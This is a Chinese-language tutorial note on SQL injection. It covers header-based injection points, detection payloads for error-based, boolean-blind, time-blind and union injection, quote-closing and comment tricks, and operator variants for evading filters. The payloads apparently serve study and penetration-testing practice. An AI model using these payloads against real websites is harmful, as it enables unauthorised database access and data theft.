很明显的这个接口，页面url，输入框的传参参数是进入了数据库的。或http数据包中数据参数是进入了数据库的。
```
**Header注入**
User Agent 中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别 客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、 浏览器插件等。
有些网站为了统计来访为手机还是PC，会存入数据库。
**Cookie注入**
一般是因为后台程序，读取了cookie中的数据，并带入到数据库中执行了
**X-Forwarded-For**
是客户端通过HTTP代理或者负载均衡器连接到web服务端获取源IP地址的一个标准（通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库或某文件，通过修改XXF 头可以实现伪造IP）
**Referer**
当浏览器向web服务器发送请求的时候，一般会带上 Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用 于处理
Host
有些服务器无论请求什么Host，都有一个默认的Host站点响应时。
```

## **测试是否有注入**
检测报错注入:
```
加\ 转义'
?id=1\    有原生报错回显

加'
?id=1' 有原生报错回显，则存在报错注入，且为 ' 闭合 或 ')闭合。

加"
?id=1"  有原生报错回显，且为 " 闭合 或 ")闭合。

?id = 1 and 1=2 有原生报错回显。
```

检测布尔盲注：
```
?id = 1 and 1=2  报错不显示正常数据，或无原生报错回显。


?id=1' and 1=1 --+  不报错
?id=1" and 1=1 #  不报错
```
实际中少用1=1，防止waf：<https://xz.aliyun.com/t/8020?time__1311=n4%2BxuDgDBAeDqrgDlroGkzD8CDkYeDce4YupD&alichlgref=https%3A%2F%2Fcn.bing.com%2F>

检测时间盲注：
```
?id=1 and sleep(3) 三秒才返回。
```

检测联合注入：
有报错注入，有布尔注入，也可能有联合注入。
有回显，寻找注入点，判断闭合方式，判断列数，进行函数执行回显。
测试当前表的字段数
```
?id =1 ' order by 5 --+  //若到5报错，则此表有4个字段

?id = -1 ' union select 1,2,3,4 --+
?id = -1 union select 1,2,3,4
前报错，后替换回显1,2,3,4
```

^
## **闭合处理**
闭合的原理：
在网站当中存在用户可控制参数，又没有对这个进行严格过滤，导致用户可以用过同样的符号去结束前面的字符内容，执行后面的语句

常见的闭合方式：
* 数字类型(无闭合)
* 单引号 ’
* 双引号 ”
* 括号 ）
* 组合方式 ‘)  ")   '))   "))

闭合后需要用到的注释符去掉后面：
```
--+ --空格

'#'  单行注释,中间用 %23

多行还是用and 'a' = 'a

语句尾部不要也可以这样闭合
;%00
```




^
## **注入类型判断**
### 联合查询
```
页面有回显，可以通过联合查询获取数据
常见于select。

select * from sql_insertion where id =1  order by view_time limit 0,1;
A  B  from sql_insertion where id =C  order by D limit 0,E;
A B可以手工注入
C可以常规注入
D难注入
E难注入
```

### 报错注入
```
页面无直接回显，但是能回显报错信息，可以通过报错函数获取回显数据。
常见于select,insert,delete,update。
```

### 布尔盲注
```
sql错误报错不回显或不回显原生报错信息，可以通过布尔判断，分别sql语句有没有成功，从对数据库进行猜测
常见于select。
```
### 时间盲注
```
sql错误报错不回显或不回显原生报错信息，可以通过页面刷新时间，判断sql语句有没有成功，从对数据库进行猜测
常见于select,insert,delete,update。
```

^
## **过滤和逻辑运算符选择**
```
id = 1 and 1
id = 1 && 1
id = 1 or 1
id = 1 || 1
id=1^1^1
id=1|1
id=1&1
```